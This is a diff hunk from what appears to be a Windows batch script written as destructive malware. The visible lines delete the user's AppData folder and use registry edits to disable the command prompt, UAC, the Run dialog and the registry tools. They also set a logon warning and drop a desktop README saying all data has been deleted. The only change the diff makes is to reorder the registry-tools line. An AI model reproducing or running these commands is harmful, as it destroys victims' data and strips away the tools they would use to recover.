@@ -23,9 +23,9 @@ RMDIR %USERPROFILE%\AppData /q /s
 %windir%\System32\cmd.exe /c %windir%\System32\reg.exe ADD HKCU\Software\Policies\Microsoft\Windows\System /v DisableCMD /t REG_DWORD /d 2 /f
 %windir%\System32\cmd.exe /c %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
 %windir%\System32\cmd.exe /c %windir%\System32\reg.exe ADD HKCU\Software\Policies\Microsoft\Windows\System /v NoRun /t REG_DWORD /d 1 /f
-%windir%\System32\cmd.exe /c %windir%\System32\reg.exe ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f
 %windir%\System32\cmd.exe /c %windir%\System32\reg.exe ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v legalnoticecaption /t REG_SZ /d "Uh oh, something's wrong..." /f
 %windir%\System32\cmd.exe /c %windir%\System32\reg.exe ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v legalnoticetext /t REG_SZ /d "Check README.txt dropped on your desktop for more information" /f
+%windir%\System32\cmd.exe /c %windir%\System32\reg.exe ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f
 
 ECHO Uh oh, something's wrong... > %USERPROFILE%\Desktop\README.txt
 ECHO Sorry, all of your data has been deleted. >> %USERPROFILE%\Desktop\README.txt
